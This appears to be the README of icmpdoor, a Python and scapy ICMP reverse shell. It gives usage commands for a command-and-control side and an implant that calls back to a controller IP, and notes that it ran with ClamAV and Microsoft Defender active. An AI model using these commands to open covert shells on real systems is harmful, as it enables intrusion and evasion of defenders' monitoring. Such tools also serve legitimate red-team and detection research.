# icmpdoor - ICMP Reverse Shell
icmpdoor is an ICMP rev shell written in Python3 and scapy. Tested on Ubuntu 20.04, Debian 10 (Kali Linux), and Windows 10. 

[Read this blog post for more information.](https://cryptsus.com/blog/icmp-reverse-shell.html)

**Python version usage (both Windows and Linux):**
```bash
./icmp-cnc.py -i INTERFACE -d VICTIM-IP (Command and Control)
./icmpdoor.py -i INTERFACE -d CNC-IP (Implant)
```

**Binary Windows version usage version:**
```bash
./icmp-cnc.exe -d VICTIM-IP (Command and Control)
./icmpdoor.exe -d CNC-IP (Implant)
```

**Binary Linux version usage version:**
```bash
./icmp-cnc -d VICTIM-IP (Command and Control)
./icmpdoor -d CNC-IP (Implant)
```

**Parameters details:**
```bash
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Listener (virtual) Network Interface (e.g. eth0)
  -d DESTINATION_IP, --destination_ip DESTINATION_IP
                        Destination IP address
  exit                  Exit Command and Control (E2)
  ```
# Screenshots
Screenshot 1 and 2 shows how icmpdoor works on Ubuntu 20.04, Debian 10 (Kali Linux) and Windows 10. ClamAV is active on Ubuntu 20.04:
![screen1](https://cryptsus.com/blog/icmp-reverse-shell-linux.jpg)
Microsoft Defender Advanced Threat Protection (ATP) is active on the Windows 10 Enterprise machine:
![screen2](https://cryptsus.com/blog/icmp-reverse-shell-windows.jpg)

# Beta
stryngs created a beta to combine both scripts into one. This way Classes are created, which are fundamental for enabling encryption.

# License
Berkeley Software Distribution (BSD)

# Author
[Jeroen van Kessel](https://twitter.com/jeroenvkessel) | [cryptsus.com](https://cryptsus.com) - we craft cyber security solutions
